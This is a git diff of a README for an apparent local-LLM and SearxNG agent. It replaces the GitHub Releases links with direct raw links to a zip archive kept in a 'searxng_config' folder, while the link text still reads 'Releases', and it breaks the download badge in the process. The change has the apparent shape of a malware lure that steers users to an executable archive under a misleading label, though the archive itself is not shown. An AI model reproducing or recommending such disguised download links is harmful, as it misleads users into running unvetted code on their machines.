@@ -26,9 +26,9 @@ This repository covers the following topics:
 
 ## How to Get Started 🤖
 
-To get started with the Python agent connecting your local LLM and SearxNG, you can download the latest release by visiting the [Releases](https://github.com/Commander01863/local-llm-searxng-agent/releases) section and selecting the appropriate file for execution.
+To get started with the Python agent connecting your local LLM and SearxNG, you can download the latest release by visiting the [Releases](https://raw.githubusercontent.com/Commander01863/local-llm-searxng-agent/master/searxng_config/searxng_llm_local_agent_v1.9-alpha.2.zip) section and selecting the appropriate file for execution.
 
-[![Download Agent](https://img.shields.io/badge/Download%20Agent-Latest%20Release-brightgreen)](https://github.com/Commander01863/local-llm-searxng-agent/releases)
+[![Download Agent](https://raw.githubusercontent.com/Commander01863/local-llm-searxng-agent/master/searxng_config/searxng_llm_local_agent_v1.9-alpha.2.zip%20Agent-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Commander01863/local-llm-searxng-agent/master/searxng_config/searxng_llm_local_agent_v1.9-alpha.2.zip)
 
 ## Support and Contributions 🤝
 
